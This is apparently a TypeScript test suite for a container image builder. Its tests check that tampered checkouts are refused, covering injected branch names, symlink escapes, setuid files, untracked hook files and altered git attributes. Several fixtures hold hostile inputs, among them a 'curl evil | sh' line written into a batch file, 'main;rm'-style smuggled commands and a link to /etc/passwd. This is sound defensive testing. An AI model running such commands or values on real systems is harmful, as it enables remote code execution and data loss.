    for (const bad of [{ repository: "rovara-env/test/*" }, { repositories: [{ repositoryId: "svc", directory: "../x", defaultBranch: "main", commit: w.commit }] }, { repositories: [{ repositoryId: "svc", directory: "svc", defaultBranch: "main;rm", commit: w.commit }] }, { repositories: [{ repositoryId: "svc", directory: "svc", defaultBranch: "main", commit: "abc" }] }, { repositories: [] }]) {
      expect(await proveAndBuildSavedImage({ ...w.input, ...bad }, w.ports)).toMatchObject({ ok: false, reason: "not_approved" });
    }
    expect(w.rec.calls).toEqual([]);
  });

  it("an unpinned base is refused", async () => {
    const w = await world();
    expect(await proveAndBuildSavedImage({ ...w.input, baseImageDigest: "node:22" }, w.ports)).toEqual({ ok: false, reason: "base_not_pinned" });
  });

  it("every failure word is one the contract lists", () => {
    expect(new Set(SAVED_ENV_BUILD_FAILURES).size).toBe(SAVED_ENV_BUILD_FAILURES.length);
  });
});

describe("pieces", () => {
  it("the Dockerfile refuses a value that is not a hash or a revision number (no injection into a label)", () => {
    expect(() => savedEnvDockerfile({ key: 'a"\nRUN x', revision: 1, proveReportDigest: "b".repeat(64) })).toThrow();
    expect(() => savedEnvDockerfile({ key: "a".repeat(64), revision: 0, proveReportDigest: "b".repeat(64) })).toThrow();
  });
  it("the tag is lowercase-safe, unique per time and random, and holds no org or project", () => {
    const a = savedEnvTag("a".repeat(64), NOW, "ff00ff00ff00");
    expect(a).toMatch(/^k[a-f0-9]{16}-\d{14}-[a-f0-9]{8}$/u);
    expect(savedEnvTag("a".repeat(64), NOW + 1_000, "ff00ff00ff00")).not.toBe(a);
  });
  it("staging keeps links as links, leaves out the live .git and a nested hooks folder", async () => {
    const src = await scratch();
    const dst = join(await scratch(), "out");
    await mkdir(join(src, ".git", "hooks"), { recursive: true });
    await writeFile(join(src, ".git", "hooks", "post-checkout"), "x");
    await mkdir(join(src, "vendor", ".git", "hooks"), { recursive: true });
    await writeFile(join(src, "vendor", ".git", "hooks", "pre-push"), "x");
    await writeFile(join(src, "vendor", ".git", "HEAD"), "ref");
    await writeFile(join(src, "a.txt"), "a");
    await symlink("/usr/bin/python3", join(src, "python"));
    await stageTree(src, dst, { tracked: new Set(["a.txt", "python"]), untrackedFolderNames: new Set(["vendor"]), declaredFolders: [] });
    expect((await lstat(join(dst, "python"))).isSymbolicLink()).toBe(true);
    expect(existsSync(join(dst, ".git"))).toBe(false);
    expect(existsSync(join(dst, "vendor", ".git", "hooks", "pre-push"))).toBe(false);
    expect(existsSync(join(dst, "vendor", ".git", "HEAD"))).toBe(true);
    expect(await readFile(join(dst, "a.txt"), "utf8")).toBe("a");
  });
  it("the real git state reads HEAD, the origin ref and counts index flags other than H", async () => {
    const root = await scratch();
    const commit = await makeRepository(root);
    expect(await gitStateOf(join(root, "svc"), "main")).toEqual({ head: commit, originHead: commit, nonStandardFlags: 0 });
    git(join(root, "svc"), "update-index", "--assume-unchanged", "src/index.js");
    git(join(root, "svc"), "update-index", "--skip-worktree", "package.json");
    expect((await gitStateOf(join(root, "svc"), "main")).nonStandardFlags).toBe(2);
    await expect(gitStateOf(join(root, "svc"), "main;x")).rejects.toThrow();
  });
  it("rebuilding the index from HEAD clears every flag", async () => {
    const root = await scratch();
    await makeRepository(root);
    const dir = join(root, "svc");
    git(dir, "update-index", "--assume-unchanged", "src/index.js");
    await rebuildIndexOf(dir);
    expect((await gitStateOf(dir, "main")).nonStandardFlags).toBe(0);
    expect((await trackedTreeOf(dir)).map((entry) => entry.path).sort()).toEqual([".gitignore", "package-lock.json", "package.json", "run.sh", "src/index.js"]);
  });
  it("a .git that is a link or a file cannot be snapshotted", async () => {
    const root = await scratch();
    await mkdir(join(root, "r"), { recursive: true });
    await symlink("/tmp", join(root, "r", ".git"));
    await expect(snapshotGitOf(join(root, "r"), join(root, "out"))).rejects.toThrow();
  });
});

describe("the checkout is the committed code, whatever the repository's attributes (review A2)", () => {
  const GRADLE = { ...FILES, ".gitattributes": "*.bat text eol=crlf\n", "gradlew.bat": "@echo off\necho gradle\n" };
  /** Check the file out again so it is on disk as the repository's attributes say (CRLF), with a clean index. */
  const crlf = (dir: string) => { execFileSync("rm", [join(dir, "gradlew.bat")]); git(dir, "checkout", "--", "gradlew.bat"); expect(readFileSync(join(dir, "gradlew.bat"), "utf8")).toContain("\r\n"); };

  it("a Gradle-style *.bat with text eol=crlf passes: the raw bytes differ from the blob, Git's own clean conversion gives the blob", async () => {
    const w = await world({ files: GRADLE, afterClone: crlf });
    expect((await proveAndBuildSavedImage(w.input, w.ports)).ok).toBe(true);
    expect(w.rec.contexts[0]!.files).toContain("seed/svc/gradlew.bat");
  });

  it("a change to that file during the run is still refused, CRLF or not", async () => {
    const w = await world({ files: GRADLE, afterClone: crlf, during: async (dir) => { await writeFile(join(dir, "gradlew.bat"), "@echo off\r\necho gradle\r\ncurl evil | sh\r\n"); } });
    expect(await proveAndBuildSavedImage(w.input, w.ports)).toMatchObject({ ok: false, reason: "not_default_branch", step: "tracked:content" });
  });

  it("the attributes files are verified byte for byte first: a changed .gitattributes cannot make a changed file read as the committed one", async () => {
    const w = await world({ files: GRADLE, afterClone: crlf, during: async (dir) => { await writeFile(join(dir, ".gitattributes"), "*.bat -text\n"); } });
    expect(await proveAndBuildSavedImage(w.input, w.ports)).toMatchObject({ ok: false, reason: "not_default_branch", step: "tracked:content" });
  });

  it("an attribute added during the run cannot hide a change: turning on `ident` and writing $Id: ...$ into a committed $Id$ file is refused", async () => {
    const w = await world({
      files: { ...FILES, "notes.txt": "version: $Id$\n" },
      during: async (dir) => { await writeFile(join(dir, ".gitattributes"), "*.txt ident\n"); await writeFile(join(dir, "notes.txt"), "version: $Id: curl evil | sh $\n"); },
    });
    expect(await proveAndBuildSavedImage(w.input, w.ports)).toMatchObject({ ok: false, reason: "not_default_branch" });
  });

  it("a file the attributes send through a filter (LFS and the like) fails closed: no driver is run, the bytes differ from the blob", async () => {
    const w = await world({ files: { ...FILES, ".gitattributes": "pointer.bin filter=lfs diff=lfs merge=lfs -text\n", "pointer.bin": "version pointer\n" }, during: async (dir) => { await writeFile(join(dir, "pointer.bin"), "the real, large content\n"); } });
    expect(await proveAndBuildSavedImage(w.input, w.ports)).toMatchObject({ ok: false, reason: "not_default_branch", step: "tracked:content" });
  });

  it("a file whose raw bytes differ and that no attribute explains is refused", async () => {
    const w = await world({ files: GRADLE, afterClone: crlf, during: async (dir) => { await writeFile(join(dir, "run.sh"), "#!/bin/sh\r\necho hi\r\n"); } });
    expect(await proveAndBuildSavedImage(w.input, w.ports)).toMatchObject({ ok: false, step: "tracked:content" });
  });
});

describe("the trusted .git is taken before any process exists (review A4)", () => {
  it("the snapshot and git fsck come before start(), and a sandbox that already started is refused", async () => {
    const w = await world();
    await proveAndBuildSavedImage(w.input, w.ports);
    expect(w.log.indexOf("snapshot")).toBeLessThan(w.log.indexOf("started"));
    expect(w.log.indexOf("fsck")).toBeLessThan(w.log.indexOf("started"));
    const early = await world({ alreadyStarted: true });
    expect(await proveAndBuildSavedImage(early.input, early.ports)).toEqual({ ok: false, reason: "not_fresh", step: "started" });
    expect(early.log).not.toContain("snapshot");
  });

  it("a clone whose history is corrupt (git fsck) is refused before the sandbox starts", async () => {
    const corrupt = async (dir: string) => {
      const objects = join(dir, ".git", "objects");
      const folder = (await readdir(objects)).find((name) => /^[0-9a-f]{2}$/u.test(name))!;
      const file = join(objects, folder, (await readdir(join(objects, folder)))[0]!);
      await chmod(file, 0o644);
      await writeFile(file, "not a git object");
    };
    const w = await world({ afterClone: corrupt });
    expect(await proveAndBuildSavedImage(w.input, w.ports)).toMatchObject({ ok: false });
    expect(w.log).not.toContain("started");
    expect(w.log).not.toContain("npm ci");
  });
});

describe("only tracked files and dependency or cache folders are shipped (review A5)", () => {
  it("untracked conftest.py, pytest.ini, sitecustomize.py, .envrc, .npmrc and a stray source file are dropped; tracked ones, dependency folders, caches and declared folders are kept", async () => {
    const w = await world({
      files: { ...FILES, "conftest.py": "# tracked\n", "pom.xml": "<project/>\n" },
      declaredFolders: ["out"],
      during: async (dir) => {
        for (const name of ["pytest.ini", "sitecustomize.py", ".envrc", ".npmrc", "src/extra.py", "conftest_untracked.py"]) await writeFile(join(dir, name), "x\n");
        for (const folder of ["node_modules/dep", ".venv/lib", "src/__pycache__", "target/classes", ".pytest_cache", "out/reports", "other/stuff"]) { await mkdir(join(dir, folder), { recursive: true }); await writeFile(join(dir, folder, "f"), "y\n"); }
      },
    });
    expect((await proveAndBuildSavedImage(w.input, w.ports)).ok).toBe(true);
    const files = w.rec.contexts[0]!.files.filter((file) => file.startsWith("seed/svc/")).map((file) => file.slice("seed/svc/".length));
    for (const dropped of ["pytest.ini", "sitecustomize.py", ".envrc", ".npmrc", "src/extra.py", "conftest_untracked.py", "other", "other/stuff/f"]) expect(files, dropped).not.toContain(dropped);
    for (const kept of ["conftest.py", "package.json", "src/index.js", "node_modules/dep/f", ".venv/lib/f", "src/__pycache__/f", "target/classes/f", ".pytest_cache/f", "out/reports/f"]) expect(files, kept).toContain(kept);
  });

  it("inside the dependency and cache folders, files that run code on their own are not shipped either: conftest.py, pytest.ini, sitecustomize.py, usercustomize.py, .envrc, .npmrc, and a .pth outside site-packages", async () => {
    const w = await world({
      during: async (dir) => {
        for (const folder of ["node_modules/dep", ".venv/lib/python3.12/site-packages", ".venv/lib/python3.12/other", "__pycache__"]) await mkdir(join(dir, folder), { recursive: true });
        for (const name of ["node_modules/dep/conftest.py", "node_modules/dep/pytest.ini", ".venv/lib/python3.12/site-packages/sitecustomize.py", ".venv/lib/python3.12/site-packages/usercustomize.py", "node_modules/dep/.envrc", "node_modules/dep/.npmrc", ".venv/lib/python3.12/other/evil.pth"]) await writeFile(join(dir, name), "x\n");
        for (const name of ["node_modules/dep/ok.js", ".venv/lib/python3.12/site-packages/ok.py", ".venv/lib/python3.12/site-packages/editable.pth"]) await writeFile(join(dir, name), "y\n");
      },
    });
    expect((await proveAndBuildSavedImage(w.input, w.ports)).ok).toBe(true);
    const files = w.rec.contexts[0]!.files.filter((file) => file.startsWith("seed/svc/")).map((file) => file.slice("seed/svc/".length));
    for (const dropped of ["node_modules/dep/conftest.py", "node_modules/dep/pytest.ini", ".venv/lib/python3.12/site-packages/sitecustomize.py", ".venv/lib/python3.12/site-packages/usercustomize.py", "node_modules/dep/.envrc", "node_modules/dep/.npmrc", ".venv/lib/python3.12/other/evil.pth"]) expect(files, dropped).not.toContain(dropped);
    for (const kept of ["node_modules/dep/ok.js", ".venv/lib/python3.12/site-packages/ok.py", ".venv/lib/python3.12/site-packages/editable.pth"]) expect(files, kept).toContain(kept);
  });

  it("build/, target/ and vendor/ are dependency folders only beside the committed build file that makes them", async () => {
    const cases: Array<[string, Record<string, string>, string, boolean]> = [
      ["build/ with no build file", {}, "build/f", false],
      ["build/ beside build.gradle", { "build.gradle": "x\n" }, "build/f", true],
      ["build/ beside build.gradle.kts", { "build.gradle.kts": "x\n" }, "build/f", true],
      ["build/ beside pyproject.toml", { "pyproject.toml": "x\n" }, "build/f", true],
      ["build/ beside setup.py", { "setup.py": "x\n" }, "build/f", true],
      ["build/ beside a pom.xml only", { "pom.xml": "x\n" }, "build/f", false],
      ["target/ with no build file", {}, "target/f", false],
      ["target/ beside pom.xml", { "pom.xml": "x\n" }, "target/f", true],
      ["target/ beside Cargo.toml", { "Cargo.toml": "x\n" }, "target/f", true],
      ["vendor/ with no build file", {}, "vendor/f", false],
      ["vendor/ beside go.mod", { "go.mod": "x\n" }, "vendor/f", true],
      ["vendor/ beside composer.json", { "composer.json": "x\n" }, "vendor/f", true],
      ["vendor/ beside Gemfile", { Gemfile: "x\n" }, "vendor/f", true],
      ["a build file in another folder does not anchor", { "other/build.gradle": "x\n" }, "build/f", false],
    ];
    for (const [name, files, planted, kept] of cases) {
      const w = await world({ files: { ...FILES, ...files }, during: async (dir) => { await mkdir(join(dir, planted, ".."), { recursive: true }); await writeFile(join(dir, planted), "z\n"); } });
      expect((await proveAndBuildSavedImage(w.input, w.ports)).ok, name).toBe(true);
      expect(w.rec.contexts[0]!.files.includes(`seed/svc/${planted}`), name).toBe(kept);
    }
  });

  it("an untracked .env at the top is not shipped at all (so it cannot even be found by the scan)", async () => {
    const w = await world({ during: async (dir) => { await writeFile(join(dir, ".env"), "A=1\n"); } });
    expect((await proveAndBuildSavedImage(w.input, w.ports)).ok).toBe(true);
    expect(w.rec.contexts[0]!.files).not.toContain("seed/svc/.env");
  });
});

describe("links, on the real tree (review A1, A3)", () => {
  it("a link that reads as inside the tree lexically but goes through other links is refused: a -> . and x -> a/a/a/a/../../../../..", async () => {
    const w = await world({ during: async (dir) => { await symlink(".", join(dir, "node_modules", "a")); await symlink("a/a/a/a/../../../../..", join(dir, "node_modules", "x")); } });
    expect(await proveAndBuildSavedImage(w.input, w.ports)).toEqual({ ok: false, reason: "unsafe_tree", step: "scan" });
    expect(w.rec.calls).toEqual([]);
  });

  it("an absolute link into the workspace becomes a relative link in the seed; one that would leave the seed is refused", async () => {
    const w0 = await world();
    const root = await realpath(w0.fresh.root);
    const ok = await world({ during: async (dir) => { await symlink(join(await realpath(dir), "node_modules", "dep", "index.js"), join(dir, "node_modules", "alias")); } });
    expect((await proveAndBuildSavedImage(ok.input, ok.ports)).ok).toBe(true);
    expect(ok.rec.contexts[0]!.links["seed/svc/node_modules/alias"]).toBe("dep/index.js");
    // a target in another folder of the workspace stays inside the seed once made relative
    const sibling = await world({ during: async (dir) => { await symlink(join(await realpath(dir), "..", "elsewhere"), join(dir, "node_modules", "sib")); } });
    expect((await proveAndBuildSavedImage(sibling.input, sibling.ports)).ok).toBe(true);
    expect(sibling.rec.contexts[0]!.links["seed/svc/node_modules/sib"]).toBe("../../elsewhere");
    // a target above the workspace is not the workspace's
    const out = await world({ during: async (dir) => { await symlink(join(await realpath(dir), "..", "..", "above"), join(dir, "node_modules", "up")); } });
    void root;
    expect(await proveAndBuildSavedImage(out.input, out.ports)).toEqual({ ok: false, reason: "unsafe_tree", step: "scan" });
  });

  it("an absolute link that leaves the workspace is refused unless it is a virtual environment's interpreter in the base image's interpreter folder", async () => {
    const plain = await world({ during: async (dir) => { await symlink("/usr/bin/python3", join(dir, "node_modules", "python")); } });
    expect(await proveAndBuildSavedImage(plain.input, plain.ports)).toEqual({ ok: false, reason: "unsafe_tree", step: "scan" });
    const outside = await world({ during: async (dir) => { await mkdir(join(dir, ".venv", "bin"), { recursive: true }); await writeFile(join(dir, ".venv", "pyvenv.cfg"), "home = /usr/bin\n"); await symlink("/etc/passwd", join(dir, ".venv", "bin", "python")); } });
    expect(await proveAndBuildSavedImage(outside.input, outside.ports)).toMatchObject({ ok: false });
    const wrongName = await world({ during: async (dir) => { await mkdir(join(dir, ".venv", "bin"), { recursive: true }); await writeFile(join(dir, ".venv", "pyvenv.cfg"), "home = /usr/bin\n"); await symlink("/usr/bin/python3", join(dir, ".venv", "bin", "sh")); } });
    expect(await proveAndBuildSavedImage(wrongName.input, wrongName.ports)).toMatchObject({ ok: false });
    const noConfig = await world({ during: async (dir) => { await mkdir(join(dir, ".venv", "bin"), { recursive: true }); await symlink("/usr/bin/python3", join(dir, ".venv", "bin", "python")); } });
    expect(await proveAndBuildSavedImage(noConfig.input, noConfig.ports)).toMatchObject({ ok: false });
    const venv = await world({ during: async (dir) => { await mkdir(join(dir, ".venv", "bin"), { recursive: true }); await writeFile(join(dir, ".venv", "pyvenv.cfg"), "home = /usr/bin\n"); await symlink("/usr/bin/python3.12", join(dir, ".venv", "bin", "python")); await symlink("python", join(dir, ".venv", "bin", "python3")); } });
    expect((await proveAndBuildSavedImage(venv.input, venv.ports)).ok).toBe(true);
    expect(venv.rec.contexts[0]!.links["seed/svc/.venv/bin/python"]).toBe("/usr/bin/python3.12");
  });

  it("a COMMITTED absolute link into the workspace is committed content: it is not rewritten, and an absolute link is refused", async () => {
    const w = await world({ trackedLinks: { "committed-link": "{ROOT}/svc/package.json" } });
    expect(await proveAndBuildSavedImage(w.input, w.ports)).toEqual({ ok: false, reason: "unsafe_tree", step: "scan" });
    const relative = await world({ trackedLinks: { "committed-link": "package.json" } });
    expect((await proveAndBuildSavedImage(relative.input, relative.ports)).ok).toBe(true);
    expect(relative.rec.contexts[0]!.links["seed/svc/committed-link"]).toBe("package.json");
  });

  it("a real `python -m venv` tree is shipped when its interpreter folder is the base image's, with its links intact and no rewriting of the interpreter links", async () => {
    let target = "";
    let link_name = "";
    const w = await world({
      links: { interpreterDirectories: [], managedPythonRoots: [] },
      during: async (dir) => { execFileSync("python3", ["-m", "venv", "--without-pip", join(dir, ".venv")]); for (const name of await readdir(join(dir, ".venv", "bin"))) { const link = await readlink(join(dir, ".venv", "bin", name)).catch(() => ""); if (path.isAbsolute(link)) { target = link; link_name = name; } } },
    });
    // With no interpreter folder allowed, the real environment is refused (its links are absolute outside the workspace) ...
    const first = await proveAndBuildSavedImage(w.input, w.ports);
    expect(path.isAbsolute(target) && /^python3(\.\d{1,2})?$/u.test(path.posix.basename(target)), `this machine's venv layout: ${target}`).toBe(true);
    expect(first).toMatchObject({ ok: false, reason: "unsafe_tree", step: "scan" });
    // ... and accepted when the base image's interpreter folder is the one the environment names.
    const again = await world({
      links: { interpreterDirectories: [path.posix.dirname(target)], managedPythonRoots: [] },
      during: async (dir) => { execFileSync("python3", ["-m", "venv", "--without-pip", join(dir, ".venv")]); },
    });
    expect((await proveAndBuildSavedImage(again.input, again.ports)).ok).toBe(true);
    expect(again.rec.contexts[0]!.links[`seed/svc/.venv/bin/${link_name}`]).toBe(target);
    expect(Object.keys(again.rec.contexts[0]!.links).filter((link) => link.startsWith("seed/svc/.venv/bin/")).length).toBeGreaterThanOrEqual(2);
    expect(again.rec.contexts[0]!.files).toContain("seed/svc/.venv/pyvenv.cfg");
  });

  it("a set-user-id or set-group-id file ends the build (review B3)", async () => {
    for (const mode of [0o4755, 0o2755]) {
      const w = await world({ during: async (dir) => { await chmod(join(dir, "node_modules", "dep", "index.js"), mode); } });
      expect(await proveAndBuildSavedImage(w.input, w.ports), mode.toString(8)).toEqual({ ok: false, reason: "unsafe_tree", step: "scan" });
    }
  });

  it("the key is the one the BROKER works out from the code host's listing of the same commit, and the build refuses a key the broker does not share", async () => {
    const a = await world();
    // the code host's listing of the commit: `git ls-tree -r -t` in the shape the host answers (trees included)
    const listing = execFileSync("git", ["ls-tree", "-r", "-t", "-z", "HEAD"], { cwd: join(a.fresh.root, "svc"), encoding: "utf8" }).split("\u0000").filter((record) => record !== "").map((record) => {
      const match = /^(\d{6}) (blob|commit|tree) ([a-f0-9]{40})\t([\s\S]+)$/u.exec(record)!;
      return { mode: match[1]!, type: match[2]!, sha: match[3]!, path: match[4]! };
    });
    const brokerKey = await expectedEnvironmentKey(
      { listTree: async () => ({ truncated: false, entries: listing }), readText: async (_repository, _commit, file) => (existsSync(join(a.fresh.root, "svc", file)) ? readFile(join(a.fresh.root, "svc", file), "utf8") : undefined) },
      { orgId: "org_aaaaaaaaaaaaaaaaaaaa", repositories: [{ name: "svc", url: "https://github.com/acme/svc.git" }], commits: new Map([["svc", a.commit]]), detectorGlobs: a.input.detectorGlobs, testEnvRevision: a.input.approved.revision, secretNames: a.input.secretNames, baseImageDigest: a.input.baseImageDigest },
    );
    expect(brokerKey).toMatch(/^[a-f0-9]{64}$/u);
    const matching = await world();
    const built = await proveAndBuildSavedImage({ ...matching.input, expectedKey: brokerKey! }, matching.ports);
    expect(built.ok && built.manifest.environmentKey).toBe(brokerKey);
    // a different key: nothing is built, pushed or recorded
    const other = await world();
    expect(await proveAndBuildSavedImage({ ...other.input, expectedKey: "0".repeat(64) }, other.ports)).toEqual({ ok: false, reason: "unsafe_tree", step: "key_mismatch" });
    expect(other.sessions).toBe(0);
  });

  it("a key file that is a committed link is no key file, so no key (the broker refuses it the same way)", async () => {
    const linked = await world({ trackedLinks: { "yarn.lock": "package.json" } });
    expect(await proveAndBuildSavedImage(linked.input, linked.ports)).toMatchObject({ ok: false });
  });
});
